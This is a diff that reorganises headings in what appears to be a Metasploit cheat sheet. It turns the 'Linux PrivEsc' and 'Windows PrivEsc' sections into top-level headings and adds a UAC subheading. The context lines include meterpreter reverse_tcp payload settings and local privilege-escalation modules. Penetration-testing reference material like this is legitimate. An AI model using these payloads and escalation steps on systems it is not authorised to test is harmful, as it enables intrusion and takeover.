@@ -808,8 +808,7 @@ set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
-# Escalate Privileges
-### Linux PrivEsc
+# Escalate Privileges - Linux
 ##### [Get System Information](#Get-System-Information-of-Exploited-Target)
 ##### [Linux Modules]
 |  # | Name | Description |
@@ -882,7 +881,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 use exploit/linux/local
 ```
 
-### Windows PrivEsc
+# Escalate Privileges - Windows
 ##### [Get System Information](#Get-System-Information-of-Exploited-Target)
 ##### Escalate Privileges with GetSystem (Windows)
 | -t | Type |
@@ -901,6 +900,7 @@ use post/windows/gather/win_privs
 set SESSION <Session #>
 run
 ```
+### UAC
 ##### Escalate Privileges Under UAC
 ```bash
 # Determine if UAC is enabled, if so, getsystem will fail
